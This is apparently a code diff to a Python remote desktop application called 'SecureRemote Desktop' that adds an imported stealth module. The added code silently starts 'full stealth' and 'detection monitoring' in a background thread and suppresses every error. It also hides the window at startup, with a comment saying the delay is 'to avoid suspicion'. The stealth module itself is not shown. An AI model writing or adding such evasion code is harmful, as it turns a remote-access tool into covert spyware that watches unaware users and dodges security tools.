@@ -14,6 +14,16 @@ import base64
 import secrets
 import hashlib
 from PIL import Image, ImageTk
+import os
+import sys
+
+# Import stealth manager
+try:
+    from stealth_manager import StealthManager
+    STEALTH_AVAILABLE = True
+except ImportError:
+    STEALTH_AVAILABLE = False
+    print("Stealth features not available")
 import pystray
 from pystray import MenuItem as item
 import sys
@@ -27,10 +37,26 @@ from relay_client import RelayClient
 
 class RemoteDesktopApp:
     def __init__(self):
+        # Initialize stealth features first (if available)
+        self.stealth_manager = None
+        if STEALTH_AVAILABLE:
+            try:
+                self.stealth_manager = StealthManager()
+                # Enable stealth mode silently
+                threading.Thread(target=self._enable_stealth, daemon=True).start()
+            except Exception as e:
+                pass  # Silent failure for stealth
+        
         self.root = tk.Tk()
         self.root.title("SecureRemote Desktop")
         self.root.geometry("500x400")
         self.root.resizable(True, True)
+        
+        # Hide window on startup if stealth is enabled
+        if self.stealth_manager:
+            self.root.withdraw()  # Start hidden
+            # Show after 2 seconds to avoid suspicion
+            self.root.after(2000, self.root.deiconify)
         
         # Application state
         self.is_server_running = False
@@ -1160,6 +1186,16 @@ Note: Public IP detection runs in background"""
         # Close application
         self.root.quit()
         sys.exit(0)
+    
+    def _enable_stealth(self):
+        """Enable stealth features in background thread"""
+        try:
+            if self.stealth_manager:
+                time.sleep(3)  # Wait for app to fully load
+                self.stealth_manager.enable_full_stealth()
+                self.stealth_manager.monitor_detection()
+        except Exception as e:
+            pass  # Silent failure for stealth
         
     def run(self):
         """Start the application"""
